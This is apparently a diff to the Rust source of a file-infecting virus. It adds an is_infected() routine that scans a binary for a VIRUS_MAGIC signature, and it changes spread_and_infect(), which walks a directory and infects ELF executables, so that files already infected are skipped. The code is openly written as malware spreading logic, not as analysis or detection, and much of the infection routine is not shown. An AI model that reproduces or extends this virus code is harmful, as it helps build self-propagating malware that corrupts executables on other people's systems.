@@ -53,6 +53,22 @@ fn is_elf(bytes: &[u8]) -> bool {
     &bytes[..4] == ELF_MAGIC
 }
 
+fn is_infected(bytes: &[u8]) -> bool {
+    let mut cur = 0;
+    for &byte in bytes {
+        if byte == VIRUS_MAGIC[cur] {
+            cur += 1;
+        } else {
+            cur = 0;
+        }
+        if cur == VIRUS_MAGIC.len() {
+            return true;
+        }
+    }
+
+    false
+}
+
 /// Parse host metadata if present
 fn parse_meta(bytes: &[u8]) -> Option<HostMeta> {
     // Copy last 16 bytes of `bytes` to an array to transmute
@@ -87,7 +103,7 @@ fn spread_and_infect(dir: &str, virus: &[u8]) {
         if !is_elf(&contents) { continue; }
 
         // Skip if this file is already infected
-        if parse_meta(&contents).is_some() { continue; }
+        if is_infected(&contents) { continue; }
 
         // Infect this file ignoring errors
         let mut new_file: Vec<u8> = vec![];
